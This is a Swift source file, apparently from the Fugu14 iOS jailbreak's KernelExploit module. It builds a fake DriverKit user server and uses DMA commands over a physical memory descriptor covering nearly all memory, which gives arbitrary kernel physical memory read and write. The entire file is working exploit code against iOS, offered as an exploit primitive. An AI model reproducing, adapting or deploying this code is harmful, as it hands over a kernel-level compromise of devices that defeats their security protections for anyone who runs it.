//
//  DK.swift
//  KernelExploit
//
//  Created by Linus Henze.
//  Copyright © 2021 Linus Henze. All rights reserved.
//

import Foundation
import JailbreakUtils
import IOKit_iOS

let DRIVERKIT_TYPE: UInt32           = 0x99000003
let kIOUserServerMethodStart: UInt32 = 0x00001001

public enum DKError: Error {
    case noPlatformExpert
    case failedToCreateIOUserServer(kr: kern_return_t)
    case failedToGetIOUserServerDKPort(kr: kern_return_t)
    case rpcError(description: String)
    case requestFailed(description: String, file: String = #file, line: Int = #line, function: String = #function)
    case failedToRegisterClass(className: String, super: String)
    case failedToAllocateMachPort
    case failedToInsertPortRight
    case failedToMallocMemory
}

var gDK: DriverKit! = nil

public protocol DriverKitObject {
    var machMsgObjData: Data { get }
}

extension DriverKitObject {
    func machMsgObjPort(_ port: mach_port_t) -> Data {
        var msg = Data()
        
        msg.appendGeneric(value: port)
        msg.appendGeneric(value: 0 as UInt32) // pad1
        msg.appendGeneric(value: 0 as UInt16) // pad2
        msg.appendGeneric(value: UInt8(MACH_MSG_TYPE_COPY_SEND))  // disposition
        msg.appendGeneric(value: UInt8(MACH_MSG_PORT_DESCRIPTOR)) // type
        
        return msg
    }
}

class DriverKit: DriverKitObject {
    var machMsgObjData: Data { machMsgObjPort(serverPort) }
    
    let _serverPort: mach_port_t
    var serverPort: mach_port_t { newServerPort ?? _serverPort }
    let ioPort: io_connect_t
    var classes: [String: mach_port_t] = [:]
    var newServerPort: mach_port_t?
    
    init(svPort: mach_port_t, ioPort: io_connect_t) {
        self._serverPort = svPort
        self.ioPort = ioPort
    }
    
    static func parseResponse(response: Data) throws -> (objs: [mach_port_t], id: UInt64, flags: UInt64, objCnt: UInt64, resultCode: UInt32?, other: Data) {
        // Read size
        var response = response
        let sz = response.getGeneric(type: UInt32.self, offset: 4)
        response = response.subdata(in: 0..<Data.Index(sz))
        
        // Read objects
        let bodyCount = response.getGeneric(type: UInt32.self, offset: 24)
        var curOff: UInt = 28
        var resultObjs: [mach_port_t] = []
        for _ in 0..<bodyCount {
            let type = response.getGeneric(type: UInt8.self, offset: curOff + 11)
            switch type {
                case UInt8(MACH_MSG_PORT_DESCRIPTOR):
                    let port = response.getGeneric(type: UInt32.self, offset: curOff)
                    resultObjs.append(port)
                    curOff += 12
                    
                case UInt8(MACH_MSG_OOL_DESCRIPTOR):
                    curOff += 16
                    
                default:
                    throw DKError.rpcError(description: "Received bad response from kernel!")
            }
        }
        
        let id = response.getGeneric(type: UInt64.self, offset: curOff + 0)
        let flags = response.getGeneric(type: UInt64.self, offset: curOff + 8)
        let objCnt = response.getGeneric(type: UInt64.self, offset: curOff + 16)
        
        // Rest is raw data
        let other = response.tryAdvance(by: Int(curOff) + 24)
        return (objs: resultObjs, id: id, flags: flags, objCnt: objCnt, resultCode: other.tryGetGeneric(type: UInt32.self), other: other)
    }
    
    func rpc(msgId: UInt64, objects: [DriverKitObject], data: Data, overrideRefs: UInt64? = nil) throws -> (objs: [mach_port_t], id: UInt64, flags: UInt64, objCnt: UInt64, resultCode: UInt32?, other: Data) {
        // First build the structure
        var msg = Data()
        
        // Message header
        // Bits and Size, will be prepended later
        let msgBits: UInt32 = UInt32(MACH_MSG_TYPE_COPY_SEND) | (UInt32(MACH_MSG_TYPE_MAKE_SEND) << 8) | MACH_MSGH_BITS_COMPLEX
        
        let replyPort = mig_get_reply_port()
        
        msg.appendGeneric(value: serverPort)  // remote port
        msg.appendGeneric(value: replyPort)   // local port
        msg.appendGeneric(value: 0 as UInt32) // voucher port
        msg.appendGeneric(value: 0x4DA2B68C as UInt32) // id
        
        // Message body
        msg.appendGeneric(value: UInt32(objects.count))
        
        // Message objects
        for o in objects {
            msg.append(o.machMsgObjData)
        }
        
        // IORPC body
        msg.appendGeneric(value: msgId)       // Message ID
        msg.appendGeneric(value: 0 as UInt64) // Flags
        msg.appendGeneric(value: overrideRefs ?? UInt64(objects.count)) // Number of objects
        
        // Reserve space for the objects
        for _ in 0..<(overrideRefs ?? UInt64(objects.count)) {
            msg.appendGeneric(value: 0 as UInt64)
        }
        
        // Append other data
        msg.append(data)
        
        // Now bits and size
        var bitsSize = Data(fromObject: msgBits)
        bitsSize.appendGeneric(value: UInt32(msg.count + 8))
        msg = bitsSize + msg
        
        // Ok, do the call
        var kr = msg.withUnsafeBytes { (buf: UnsafeRawBufferPointer) in
            return mach_msg_send(UnsafeMutablePointer(mutating: buf.baseAddress!.assumingMemoryBound(to: mach_msg_header_t.self)))
        }
        
        if kr != KERN_SUCCESS {
            throw DKError.rpcError(description: "mach_msg_send failed!")
        }
        
        guard let rcvBuf = malloc(8192) else {
            throw DKError.rpcError(description: "Failed to allocate receive buffer!")
        }
        
        let hdr = rcvBuf.assumingMemoryBound(to: mach_msg_header_t.self)
        hdr.pointee.msgh_local_port = replyPort
        hdr.pointee.msgh_size = 8192
        
        kr = mach_msg_receive(hdr)
        if kr != KERN_SUCCESS {
            throw DKError.rpcError(description: "mach_msg_receive failed!")
        }
        
        // Transfer receive buffer to a Data object
        // The data object now owns it
        let response = Data(bytesNoCopy: rcvBuf, count: 8192, deallocator: .free)
        
        return try Self.parseResponse(response: response)
    }
    
    func getBuiltinClass(withName: String, andSuper: String = "") throws -> mach_port_t {
        if let res = classes[withName] {
            return res
        }
        
        var desc = Data()
        
        var name = withName
        while name.count < 96 {
            name += "\0"
        }
        desc.append(name.data(using: .utf8)!)
        
        var superName = andSuper
        while superName.count < 96 {
            superName += "\0"
        }
        desc.append(superName.data(using: .utf8)!)
        
        desc.appendGeneric(value: 0 as UInt32) // methodOptionsSize
        desc.appendGeneric(value: 0 as UInt32) // methodOptionsOffset
        desc.appendGeneric(value: 0 as UInt32) // metaMethodOptionsSize
        desc.appendGeneric(value: 0 as UInt32) // metaMethodOptionsOffset
        desc.appendGeneric(value: 0 as UInt32) // queueNamesSize
        desc.appendGeneric(value: 0 as UInt32) // queueNamesOffset
        desc.appendGeneric(value: 0 as UInt32) // methodNamesSize
        desc.appendGeneric(value: 0 as UInt32) // methodNamesOffset
        desc.appendGeneric(value: 0 as UInt32) // metaMethodNamesSize
        desc.appendGeneric(value: 0 as UInt32) // metaMethodNamesOffset
        desc.appendGeneric(value: 0 as UInt32) // pad
        
        desc.appendGeneric(value: 0 as UInt64) // flags
        
        for _ in 0..<8 {
            desc.appendGeneric(value: 0 as UInt64) // resv1
        }
        
        // Prepend size
        desc = Data(fromObject: UInt32(desc.count) + 4) + desc
        
        var outCnt: UInt32 = 2
        var out = Data(repeating: 0, count: 8)
        let res = desc.withUnsafeBytes { (buf: UnsafeRawBufferPointer) in
            return out.withUnsafeMutableBytes { (outBuf: UnsafeMutableRawBufferPointer) in
                return (IOConnectCallMethod(ioPort, 0x00001000, nil, 0, buf.baseAddress!, buf.count, outBuf.baseAddress!.assumingMemoryBound(to: UInt64.self), &outCnt, nil, nil), outBuf.baseAddress!.assumingMemoryBound(to: UInt32.self).pointee)
            }
        }
        
        guard res.0 == KERN_SUCCESS else {
            throw DKError.failedToRegisterClass(className: withName, super: andSuper)
        }
        
        classes[withName] = res.1
        
        return res.1
    }
    
    func create(name: String, tag: UInt64) throws {
        let cls = try getBuiltinClass(withName: "IOUserServer")
        
        var dat = Data()
        dat.appendGeneric(value: 0 as UInt64) // pad
        
        var n = name
        while n.count < 64 {
            n += "\0"
        }
        
        dat.append(n.data(using: .utf8)!) // name
        dat.appendGeneric(value: tag) // tag
        dat.appendGeneric(value: 0 as UInt64) // options
        
        let res = try rpc(msgId: 0xC1DBAEE5E75E22B9, objects: [cls], data: dat)
        guard res.resultCode == 0 else {
            throw DKError.requestFailed(description: "Failed to create IOUserServer")
        }
        
        guard res.objs.count >= 1 else {
            throw DKError.requestFailed(description: "Bad response: No error but didn't receive handle for the created IOUserServer?!")
        }
        
        newServerPort = res.objs[0]
    }
    
    func register() throws {
        let res = try rpc(msgId: 0xe9722c2bb1347c28, objects: [newServerPort!], data: Data())
        guard res.other.count != 8 else {
            throw DKError.requestFailed(description: "Failed to register with the kernel!")
        }
    }
    
    func setDispatchQueue(_ name: String, queue: DKDispatchQueue) throws {
        var n = name
        while n.count < 256 {
            n += "\0"
        }
        
        let res = try rpc(msgId: 0xe608ae8273dae1bc, objects: [newServerPort!, queue], data: Data(repeating: 0, count: 8) + n.data(using: .utf8)!)
        guard res.other.tryGetGeneric(type: UInt32.self) == 0 else {
            throw DKError.requestFailed(description: "Failed to set dispatch queue!")
        }
    }
}

extension mach_port_t: DriverKitObject {
    public var machMsgObjData: Data {
        return machMsgObjPort(self)
    }
}

class DKDispatchQueue: DriverKitObject {
    var machMsgObjData: Data { machMsgObjPort(uextPort) }
    let uextPort: mach_port_t
    
    init(name: String) throws {
        let cls = try gDK.getBuiltinClass(withName: "IODispatchQueue")
        
        var namePadded = name
        while namePadded.count < 256 {
            namePadded += "\0"
        }
        
        let dat = Data(fromObject: 0 as UInt64) + namePadded.data(using: .utf8)! + Data(fromObject: 0 as UInt64)
        
        let res = try gDK.rpc(msgId: 0xac000428df2a91d0, objects: [cls], data: dat)
        guard res.resultCode == 0 else {
            throw DKError.requestFailed(description: "Failed to create dispatch queue \(name)!")
        }
        
        guard res.objs.count >= 1 else {
            throw DKError.requestFailed(description: "Bad response: No error but didn't receive handle for the created dispatch queue?!")
        }
        
        uextPort = res.objs[0]
    }
    
    func setServerPort(_ port: mach_port_t) throws {
        let res = try gDK.rpc(msgId: 0xC437E970B5609767, objects: [uextPort, port], data: Data(), overrideRefs: 1)
        guard res.other.count != 8 else {
            throw DKError.requestFailed(description: "Failed to set server port on dispatch queue!")
        }
    }
}

func mapDescriptor(_ memObj: DriverKitObject, uncached: Bool = false) throws -> UInt64 {
    var dat = Data()
    dat.appendGeneric(value: (uncached ? 0x100 : 0) as UInt64) // Options
    dat.appendGeneric(value: 0 as UInt64) // Address
    dat.appendGeneric(value: 0 as UInt64) // Offset
    dat.appendGeneric(value: 0 as UInt64) // Length (0 = all)
    dat.appendGeneric(value: 0 as UInt64) // Alignment
    
    var res = try gDK.rpc(msgId: 0xC5E69B0414FF6EE5, objects: [memObj], data: dat)
    guard res.resultCode == 0 else {
        throw DKError.requestFailed(description: "Failed to map memory descriptor!")
    }
    
    guard res.objs.count >= 1 else {
        throw DKError.requestFailed(description: "Bad response: No error but didn't receive handle for the created memory region?!")
    }
    
    let desc = res.objs[0]
    
    // Copy state
    res = try gDK.rpc(msgId: 0xFC92B3D7F2D48EC7, objects: [desc], data: Data())
    guard res.other.count != 8 else {
        throw DKError.requestFailed(description: "Failed to get state of the memory region!")
    }
    
    guard let addr = res.other.tryGetGeneric(type: UInt64.self, offset: 24) else {
        throw DKError.requestFailed(description: "Bad response: No error but didn't receive address of the memory region?!")
    }
    
    return addr
}

class PWNDMA: DriverKitObject {
    var machMsgObjData: Data { machMsgObjPort(uextPort) }
    let uextPort: mach_port_t
    let mapAddr: UInt
    let memDesc: DriverKitObject
    let remoteTask: mach_port_t?
    let lock = NSLock()
    
    init(port: mach_port_t, dmaMemDesc: DriverKitObject, mapAddr: UInt, otherTask: mach_port_t) {
        self.uextPort = port
        self.memDesc = dmaMemDesc
        //self.mapAddr = mapAddr
        //self.remoteTask = otherTask
        
        // Map the memory from the other task
        var addr: vm_address_t = 0
        vm_allocate(mach_task_self_, &addr, 0x4000, VM_FLAGS_ANYWHERE)
        
        var curProt: vm_prot_t = 0
        var maxProt: vm_prot_t = 0
        vm_remap(mach_task_self_, &addr, 0x4000, 0x3FFF, VM_FLAGS_OVERWRITE, otherTask, mapAddr, 0, &curProt, &maxProt, VM_INHERIT_DEFAULT)
        
        self.mapAddr = addr
        self.remoteTask = nil
    }
    
    init() throws {
        remoteTask = nil
        
        // Create a memory buffer
        let memBufCls = try gDK.getBuiltinClass(withName: "IOBufferMemoryDescriptor")
        var dat = Data()
        dat.appendGeneric(value: 3 as UInt64) // options
        dat.appendGeneric(value: 0x4000 as UInt64) // size
        dat.appendGeneric(value: 0 as UInt64) // alignment
        var res = try gDK.rpc(msgId: 0xb78de684e17d5a4b, objects: [memBufCls], data: dat)
        guard res.resultCode == 0 else {
            throw DKError.requestFailed(description: "Failed to create IOBufferMemoryDescriptor!")
        }
        
        guard res.objs.count >= 1,
              res.objs[0] != 0 else {
            throw DKError.requestFailed(description: "Bad response: No error but didn't receive handle for the created IOBufferMemoryDescriptor?!")
        }
        
        memDesc = res.objs[0]
        
        // Set length
        dat = Data()
        dat.appendGeneric(value: 0x4000 as UInt64) // size
        
        res = try gDK.rpc(msgId: 0xc115230c191a6a9a, objects: [memDesc], data: dat)
        guard res.other.count != 8 else {
            throw DKError.requestFailed(description: "Failed to set length on the IOBufferMemoryDescriptor!")
        }
        
        // Get state
        mapAddr = UInt(try mapDescriptor(memDesc))
        
        // Create DMA command
        let dmaCmdCls = try gDK.getBuiltinClass(withName: "IODMACommand")
        dat = Data()
        dat.appendGeneric(value: 0 as UInt64)  // options
        dat.appendGeneric(value: 0 as UInt64)  // options in specification
        dat.appendGeneric(value: 32 as UInt64) // maxAddressBits
        for _ in 0..<16 {
            dat.appendGeneric(value: 0 as UInt64) // Reserved
        }
        res = try gDK.rpc(msgId: 0xf296a92bb435af2e, objects: [dmaCmdCls, gDK.newServerPort!], data: dat)
        guard res.resultCode == 0 else {
            throw DKError.requestFailed(description: "Failed to create IODMACommand!")
        }
        
        guard res.objs.count >= 1,
              res.objs[0] != 0 else {
            throw DKError.requestFailed(description: "Bad response: No error but didn't receive handle for the created IODMACommand?!")
        }
        
        uextPort = res.objs[0]
        
        // Prepare
        dat = Data()
        dat.appendGeneric(value: 0 as UInt64) // options
        dat.appendGeneric(value: 0 as UInt64) // offset
        dat.appendGeneric(value: 0 as UInt64) // length
        dat.appendGeneric(value: 0 as UInt64) // number of segs
        res = try gDK.rpc(msgId: 0xF88A8C08B75B1110, objects: [res.objs[0], memDesc], data: dat)
        // This will fail, but thats ok
        // Just ignore the error
        // XXX: I forgot why this fails and why this is ok ¯\_(ツ)_/¯
    }
    
    func readFromMem(mem: DriverKitObject, off: UInt64, len: UInt64) throws -> Data {
        lock.lock()
        defer { lock.unlock() }
        
        guard len <= 0x4000 else {
            throw MemoryAccessError.attemptedToReadMoreThanAPage
        }
        
        // Write data into DMA command
        var dat = Data()
        dat.appendGeneric(value: 2 as UInt64) // option
        dat.appendGeneric(value: 0 as UInt64) // offset (dma)
        dat.appendGeneric(value: len) // len
        dat.appendGeneric(value: off) // offset (data)
        var res = try gDK.rpc(msgId: 0xc41cd97d9b3042ee, objects: [uextPort, mem], data: dat)
        guard res.other.count != 8 else {
            throw MemoryAccessError.failedToReadKernelData
        }
        
        // Read data into our buffer
        dat = Data()
        dat.appendGeneric(value: 1 as UInt64) // option
        dat.appendGeneric(value: 0 as UInt64) // offset (dma)
        dat.appendGeneric(value: len) // len
        dat.appendGeneric(value: 0 as UInt64) // offset (data)
        res = try gDK.rpc(msgId: 0xc41cd97d9b3042ee, objects: [uextPort, memDesc], data: dat)
        guard res.other.count != 8 else {
            throw MemoryAccessError.failedToWriteIntoOurBuffer
        }
        
        // If we are being called by Fugu14Krw, copy memory from remote
        if let tp = remoteTask {
            var res = Data(count: Int(len))
            var out: vm_size_t = 0
            let kr = res.withUnsafeMutableBytes { ptr in
                vm_read_overwrite(tp, mapAddr, vm_size_t(len), vm_address_t(bitPattern: ptr.baseAddress!), &out)
            }
            
            guard kr == KERN_SUCCESS else {
                throw MemoryAccessError.failedToCopyFromRemote
            }
            
            return res
        } else {
            return Data(bytes: UnsafeRawPointer(bitPattern: mapAddr)!, count: Int(len))
        }
    }
    
    func writeToMem(mem: DriverKitObject, off: UInt64, data: Data) throws {
        lock.lock()
        defer { lock.unlock() }
        
        guard data.count <= 0x4000 else {
            throw MemoryAccessError.attemptedToWriteMoreThanAPage
        }
        
        // Write data into buffer
        let cnt = data.count
        if let tp = remoteTask {
            // If we are being called by Fugu14Krw, copy memory to remote
            let kr = data.withUnsafeBytes { ptr in
                vm_write(tp, mapAddr, vm_offset_t(bitPattern: ptr.baseAddress!), mach_msg_type_number_t(cnt))
            }
            
            guard kr == KERN_SUCCESS else {
                throw MemoryAccessError.failedToCopyToRemote
            }
        } else {
            let addr = UnsafeMutableRawPointer(bitPattern: mapAddr)!
            data.withUnsafeBytes { (bufPtr: UnsafeRawBufferPointer) -> Void in
                memcpy(addr, bufPtr.baseAddress!, cnt)
            }
        }
        
        // Write data into DMA command
        var dat = Data()
        dat.appendGeneric(value: 2 as UInt64) // option
        dat.appendGeneric(value: 0 as UInt64) // offset (dma)
        dat.appendGeneric(value: cnt) // len
        dat.appendGeneric(value: 0 as UInt64) // offset (data)
        var res = try gDK.rpc(msgId: 0xc41cd97d9b3042ee, objects: [uextPort, memDesc], data: dat)
        guard res.other.count != 8 else {
            throw MemoryAccessError.failedToReadIntoDMABuffer
        }
        
        // Read data to physical address
        dat = Data()
        dat.appendGeneric(value: 1 as UInt64) // option
        dat.appendGeneric(value: 0 as UInt64) // offset (dma)
        dat.appendGeneric(value: cnt) // len
        dat.appendGeneric(value: off) // offset (data)
        res = try gDK.rpc(msgId: 0xc41cd97d9b3042ee, objects: [uextPort, mem], data: dat)
        guard res.other.count != 8 else {
            throw MemoryAccessError.failedToWriteKernelData
        }
    }
}

class PWNUC: DriverKitObject {
    var machMsgObjData: Data { machMsgObjPort(uextPort) }
    let uextPort: mach_port_t
    var dmaCmd: PWNDMA
    
    var entireMemDesc: DriverKitObject!
    
    init(port: mach_port_t) throws {
        uextPort = port
        
        dmaCmd = try PWNDMA()
        
        entireMemDesc = try getPhysMemDesc(forAddress: 0, size: 0xFFFFFFFFFFF)
    }
    
    init(port: mach_port_t, dmaCmd: PWNDMA, memDesc: DriverKitObject) {
        self.uextPort = port
        self.dmaCmd = dmaCmd
        self.entireMemDesc = memDesc
    }
    
    func getPhysMemDesc(forAddress address: UInt64, size: UInt64) throws -> DriverKitObject {
        // Get descriptor
        var dat = Data()
        dat.appendGeneric(value: 1 | 0x10 as UInt64) // Options
        dat.appendGeneric(value: 1 as UInt64) // Count
        dat.appendGeneric(value: 0 as UInt64) // Pad1
        dat.appendGeneric(value: address)     // Addr
        dat.appendGeneric(value: size)        // Size
        
        let res = try gDK.rpc(msgId: 0xF2FA2FAA5CC11191, objects: [self], data: dat)
        guard res.resultCode == 0 else {
            throw DKError.requestFailed(description: "Failed to create Memory Descriptor!")
        }
        
        guard res.objs.count >= 1,
              res.objs[0] != 0 else {
            throw DKError.requestFailed(description: "Bad response: No error but didn't receive handle for the created Memory Descriptor?!")
        }
        
        return res.objs[0]
    }
    
    /**
     * Read some bytes (physical address).
     */
    func readBytes(phys: UInt64, count: UInt64) throws -> Data {
        return try dmaCmd.readFromMem(mem: entireMemDesc, off: phys, len: count)
    }
    
    /**
     * Write some bytes.
     */
    func writeBytes(phys: UInt64, data: Data) throws {
        try dmaCmd.writeToMem(mem: entireMemDesc, off: phys, data: data)
    }
}

func dkLaunchExploit(token: mach_port_t, tag: UInt64) throws -> PWNUC {
    // Connect to IOPlatformExpertDevice
    let service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOPlatformExpertDevice"))
    guard service != 0 else {
        throw DKError.noPlatformExpert
    }
    
    // Create a IOUserServer
    var ioPort: io_connect_t = 0
    var kr = IOServiceOpen(service, mach_task_self_, DRIVERKIT_TYPE, &ioPort)
    guard kr == KERN_SUCCESS else {
        throw DKError.failedToCreateIOUserServer(kr: kr)
    }
    
    // Get DK port for our IOUserServer
    var mutableToken = UInt64(token)
    var serverDKPort64: UInt64 = 0
    var outCnt: UInt32 = 1
    
    kr = IOConnectCallScalarMethod(ioPort, kIOUserServerMethodStart, &mutableToken, 1, &serverDKPort64, &outCnt)
    guard kr == KERN_SUCCESS else {
        throw DKError.failedToGetIOUserServerDKPort(kr: kr)
    }
    
    let svPort = mach_port_t(serverDKPort64)
    
    gDK = DriverKit(svPort: svPort, ioPort: ioPort)
    try gDK.create(name: "PWNUserServer", tag: tag) // Setup IOUserServer
    
    // Create a queue to handle messages
    let queue = try DKDispatchQueue(name: "Root")
    var port: mach_port_t = 0
    kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
    guard kr == KERN_SUCCESS else {
        throw DKError.failedToAllocateMachPort
    }
    
    kr = mach_port_insert_right(mach_task_self_, port, port, mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND))
    guard kr == KERN_SUCCESS else {
        throw DKError.failedToInsertPortRight
    }
    
    // Set queue port
    try queue.setServerPort(port)
    
    // Now register our server
    try gDK.register()
    
    // We will now be asked to start the service we created by
    // sending our IOPersonality
    // Receive data
    guard let rcvBuf = malloc(8192) else {
        throw DKError.failedToMallocMemory
    }
    
    let hdr = rcvBuf.assumingMemoryBound(to: mach_msg_header_t.self)
    hdr.pointee.msgh_local_port = port
    hdr.pointee.msgh_size = 8192
    
    kr = mach_msg_receive(hdr)
    guard kr == KERN_SUCCESS else {
        throw DKError.rpcError(description: "mach_msg_receive failed! [dkLaunchExploit]")
    }
    
    // Transfer receive buffer to a Data object
    // The data object now owns it
    let response = Data(bytesNoCopy: rcvBuf, count: 8192, deallocator: .free)
    
    // This should be the start message
    var res = try DriverKit.parseResponse(response: response)
    guard res.id == 0xab6f76dde6d693f2 else {
        throw DKError.requestFailed(description: "Received bad message from kernel: Got something that is not the start message!")
    }
    
    guard res.objs.count >= 1 else {
        throw DKError.requestFailed(description: "Received bad message from kernel: Got start message but no object!")
    }
    
    let ioService = res.objs[0]
    
    // Get physical address reader
    var n = "PWNProps"
    while n.count < 128 {
        n += "\0"
    }
    
    // Create a user client
    res = try gDK.rpc(msgId: 0xE1A46DBD68BBE09C, objects: [ioService, ioService], data: Data(repeating: 0, count: 8) + n.data(using: .utf8)!)
    
    // Make sure our user client really is there
    guard res.resultCode == 0 else {
        throw DKError.requestFailed(description: "Failed to create a user client!")
    }
    
    guard res.objs.count >= 1,
          res.objs[0] != 0 else {
        throw DKError.requestFailed(description: "Bad response: No error but didn't receive handle for the created user client?!")
    }
    
    return try PWNUC(port: res.objs[0])
}
